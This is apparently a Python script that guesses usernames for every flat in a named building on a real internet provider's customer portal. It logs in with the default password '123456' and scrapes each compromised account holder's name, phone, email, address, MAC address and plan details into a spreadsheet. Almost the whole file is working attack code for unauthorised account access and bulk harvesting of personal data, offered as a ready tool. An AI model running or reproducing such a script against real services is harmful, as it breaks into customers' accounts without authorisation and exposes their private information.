from math import floor
import requests, xlsxwriter, os
from bs4 import BeautifulSoup

building_name = input("Enter the name of the building:- ").lstrip().lower()
totalFloors = int(input("Enter total number of floors:- "))
flatsPerFloor = int(input("Enter number of flats per floor:- "))
total = flatsPerFloor * totalFloors
print(f"\n\nNumber of flats: {total}\n\nPlease Wait...")

width = 60
count = 0

user_list = {}

for i in range(1, totalFloors + 1):
    for x in range(1, flatsPerFloor + 1):

        username = f"{building_name}{i}0{x}"

        count += 1
        progress = float(count) / float(total)
        numberOfBars = int(floor(progress * float(width)))
        numberOfTicks = width - numberOfBars
        bars = "▓" * numberOfBars
        ticks = "░" * numberOfTicks
        percentage = int(floor(progress * 100))
        print(f"[{bars}{ticks}] {percentage}%", end="\r")

        r = requests.post(
            "https://myaccount.satellitenetcom.in/Customer/PortalLogin.aspx?h8=1",
            data={
                "__LASTFOCUS": "",
                "ToolkitScriptManager1_HiddenField": ";;AjaxControlToolkit,+Version=4.1.60623.0,+Culture=neutral,+PublicKeyToken=28f01b0e84b6d53e:en-US:3a72dea3-4bbb-479b-8b97-903103ced56d:475a4ef5:effe2a26:751cdd15:5546a2b:dfad98a5:1d3ed089:497ef277:a43b07eb:d2e10b12:37e2e5c9:3cf12cf1",
                "__EVENTTARGET": "",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": "/wEPDwUKLTUxNDY5MzI5MA8WAh4iQ3VzdG9tZXJFbmFibGVDYXB0Y2hhQWZ0ZXJBdHRlbXB0MWYWCgIBD2QWBmYPZBYCZg8WAh4EVGV4dGVkAgEPFgIfAQXzBjwhRE9DVFlQRSBodG1sPg0KPGh0bWwgbGFuZz0iZW4iPg0KPGhlYWQ+DQogIDx0aXRsZT5Mb2dpbiBDcmVkZW50aWFsczwvdGl0bGU+DQogIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4NCiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuLi9DbGllbnRzcGljaWZpYy9EaWdpdGFsIFNhdGVsaXRlL2Nzcy9sb2dpbi5jc3MiPg0KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4uL2Nzcy9ib290c3RyYXAubWluLmNzcyI+DQogIDxzY3JpcHQgc3JjPSIuLi9qcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4NCiAgPHN0eWxlPg0KaW1nIHsNCiAgICBkaXNwbGF5OiBibG9jazsNCiAgICBoZWlnaHQ6IDEwMCU7DQp9DQpzcGFuI1RuQyB7DQogICAgZGlzcGxheTogbm9uZTsNCn0NCi5kaXYgLmZpcnN0IHsNCiAgICBvcGFjaXR5OiAwLjk7DQogICAgZmlsdGVyOiBhbHBoYShvcGFjaXR5PTUpOyAvKiBGb3IgSUU4IGFuZCBlYXJsaWVyICovDQp9DQoNCmJvZHksIGh0bWwgew0KICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiLi4vQ2xpZW50c3BpY2lmaWMvc2F0ZWxpdGUgTmV0Y29tL2ltYWdlcy9PVFRCYW5uZXItVjEucG5nIik7DQogICAgaGVpZ2h0OiAxMDAlOw0KICAgIGJhY2tncm91bmQtcG9zaXRpb246IHRvcDsNCiAgICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Ow0KICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogICAgbWFyZ2luLXRvcDogMDsNCiAgICBtYXJnaW4tbGVmdDogMDsNCiAgICBtYXJnaW4tcmlnaHQ6IDA7DQogICAgbWFyZ2luLWJvdHRvbTogMDsNCn0NCg0KPC9zdHlsZT4NCjwvaGVhZD5kAgIPFgIfAWVkAgMPFgIfAQXuAzxib2R5Pg0KICA8ZGl2IGNsYXNzPSJmaXJzdCI+DQo8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPg0KPGRpdiBjbGFzcz0iY29sLXNtLTQiPg0KPGRpdiBjbGFzcz0iY29sLXNtLTQiPjwvZGl2Pg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8ZGl2IGNsYXNzPSJwYW5lbCBwYW5lbC1kZWZhdWx0Ij4NCiAgICAgIDxkaXYgY2xhc3M9InBhbmVsLWhlYWRpbmciPkxvZ2luIENyZWRlbnRpYWxzPC9kaXY+DQogICAgICA8ZGl2IGNsYXNzPSJwYW5lbC1ib2R5Ij4NCiAgICAgICAgPCEtLTxpbWcgc3JjPSJEaWdpdGFsX0ZpbmFsLnBuZyIgY2xhc3M9ImNlbnRlciIgYWx0PSJEaWdpdGFsIHNhdGVsaXRlIiB3aWR0aD0iMjI4IiBoZWlnaHQ9IjE3NyI+LS0+ZAIFD2QWGAIFDxYCHwFlZAIHDxYCHgdWaXNpYmxlaBYEAgEPDxYCHwJoZGQCAw8PFgIfAmhkZAITDxYCHwJnZAIVDw9kFgIeBXN0eWxlZWQCGQ9kFgQCAQ8WAh8CZ2QCAw8PZBYCHwNlZAIdD2QWBAIBDxYCHwJnZAIDDw9kFgIfA2VkAiMPEGRkFgECAmQCKQ8PZBYCHwNlZAIrDw9kFgIfA2VkAi0PFgIfAWVkAi8PFgIeBWNsYXNzBQZmb3Jnb3RkAjEPFgIfAmhkAgcPFgIfAQViPC9kaXY+DQogIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIDxkaXYgY2xhc3M9ImNvbC1zbS00Ij48L2Rpdj4NCjwvZGl2Pg0KPC9kaXY+DQoNCjwvYm9keT4NCjwvaHRtbD5kAgkPFgIfAmhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQljaGtSZW1iZXLxqeFpUNaS5iyeLOm+lRUYsWvhAITOkAHcV5TShMlnag==",
                "__VIEWSTATEGENERATOR": "9ED6BBB5",
                "__EVENTVALIDATION": "/wEdAA4+qxGwBCI+fbcl7qIbHsuXY3plgk0YBAefRz3MyBlTcHY2+Mc6SrnAqio3oCKbxYYjCInvqtcGm8il+3aGUsAW7ZMbE1VTmxuM7T5jalU8cUq5fiMpYUTisam+OFD+B+i1N82k7PQIfi8qeAF/PEMhVma9a90npWFCrnQhrBpAVIryEXYa6oHUSQ8+d9EjQjPZDPKiUhVk39H+V9Aowtpb+Q1WB30fQ3LaO3Tvu7lxBWwAg2c4ulHYNJSb6bavDlyqCc1W4fbkY2rSDvI+toBF7mkABqcwFA9TAfI6FY79zkl7o5qtXfSUAVDAvWetdgJ2S6Rcu1hb0qo8XeEaBgWb",
                "txtUserName": username,
                "txtPassword": "123456",
                "hdnloginwith": "username",
                "save": "Log In",
                "txtForgetCapcha": "",
            },
        )
        if not BeautifulSoup(r.content, "html.parser").find(id="lblError"):
            resp = BeautifulSoup(
                requests.post(
                    "https://myaccount.satellitenetcom.in/Customer/Gauge.aspx",
                    headers={
                        "cookie": f"mIndex=0; __AntiXsrfToken={r.cookies.get_dict()['__AntiXsrfToken']}; ASP.NET_SessionId={r.history[0].cookies.get_dict()['ASP.NET_SessionId']}; SerL={r.history[0].cookies.get_dict()['SerL']}"
                    },
                ).content,
                "html.parser",
            )
            user_list[resp.find(id="lblName").text] = [
                username,
                int(resp.find(id="lblMobile").text),
                resp.find(id="lblEmail").text,
                resp.find(id="lblAddress").text,
                resp.find(id="lblValidityPeriod").text.split("Days")[0] + " Days",
                resp.find(id="lblPlanSpeed").text.split("Mbps")[0] + " Mbps",
                resp.find(id="lblCurrentUsage").text,
                resp.find(id="lblPlanName").text,
                resp.find(id="lblMacAddress").text,
                resp.find(id="lblUsageType").text,
                resp.find(id="lblExpiryDate").text,
            ]

workbook = xlsxwriter.Workbook(f"{building_name.capitalize()}.xlsx")
worksheet = workbook.add_worksheet("Data")
worksheet.set_default_row(25)

col = 0
for i in [
    "Name:",
    "Username:",
    "Mobile No:",
    "Email:",
    "Address:",
    "Validity:",
    "Speed:",
    "Usage:",
    "Plan Name:",
    "Mac Address:",
    "Plan Type:",
    "Expiry:",
]:
    worksheet.write(
        0,
        col,
        i,
        workbook.add_format(
            {"bold": True, "font_color": "black", "bg_color": "yellow", "font_size": 12}
        ),
    )
    col += 1

row = 1
for key in user_list:
    worksheet.write(row, 0, key)
    col = 1
    for i in user_list[key]:
        worksheet.write(row, col, i)
        col += 1
    row += 1

worksheet.set_row(0, 30)
worksheet.set_column(0, 0, 25)
worksheet.set_column(1, 1, 13)
worksheet.set_column(2, 2, 12)
worksheet.set_column(3, 3, 26)
worksheet.set_column(4, 4, 90)
worksheet.set_column(5, 5, 9)
worksheet.set_column(6, 6, 12)
worksheet.set_column(7, 7, 11)
worksheet.set_column(8, 8, 22)
worksheet.set_column(9, 9, 16)
worksheet.set_column(10, 10, 11)
worksheet.set_column(11, 11, 12)
workbook.close()
print(" " * 100 + f"\nOutput saved to {building_name.capitalize()}.xlsx\n")
os.system("pause")
